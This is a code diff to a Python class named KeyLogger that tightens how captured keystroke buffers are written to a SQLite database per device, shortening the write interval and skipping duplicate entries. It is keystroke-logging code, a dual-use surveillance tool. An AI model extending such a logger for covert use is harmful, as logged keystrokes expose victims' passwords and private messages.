@@ -72,27 +72,45 @@ class KeyLogger:
 
     def write_to_db(self):
         while self.running:
-            time.sleep(15)  # Wait longer between checks
+            time.sleep(5)  # Reduced from 15 to 5 seconds
             current_time = time.time()
             with self.buffer_lock:
+                # Only write if we have content and enough time has passed or buffer is large
                 if self.key_buffer and (current_time - self.last_write >= 2.0 or len(self.key_buffer) > 100):
                     try:
                         content = ''.join(self.key_buffer)
-                        timestamp = self.get_timestamp()
-                        
+                        # Only write if we have non-whitespace content
                         if content.strip():
-                            logger.debug(f"Attempting to write to DB: {content}")
+                            timestamp = self.get_timestamp()
+                            
+                            # Check for duplicate content
                             conn = sqlite3.connect(self.db_path)
                             c = conn.cursor()
-                            c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
-                                    (self.device_id, timestamp, content))
-                            conn.commit()
+                            
+                            # Get the last entry for this device
+                            c.execute("""
+                                SELECT content FROM keystrokes 
+                                WHERE device_id = ? 
+                                ORDER BY id DESC LIMIT 1
+                            """, (self.device_id,))
+                            
+                            last_entry = c.fetchone()
+                            
+                            # Only write if content is different from last entry
+                            if not last_entry or last_entry[0] != content:
+                                logger.debug(f"Writing new content to DB: {content}")
+                                c.execute("""
+                                    INSERT INTO keystrokes (device_id, timestamp, content) 
+                                    VALUES (?, ?, ?)
+                                """, (self.device_id, timestamp, content))
+                                conn.commit()
+                                logger.debug(f"Successfully wrote to DB: {timestamp} - {content}")
+                            
                             conn.close()
                             
-                            logger.debug(f"Successfully wrote to DB: {timestamp} - {content}")
-                        
                         self.key_buffer.clear()
                         self.last_write = current_time
+                        
                     except Exception as e:
                         logger.error(f"Error writing to DB: {e}")
 
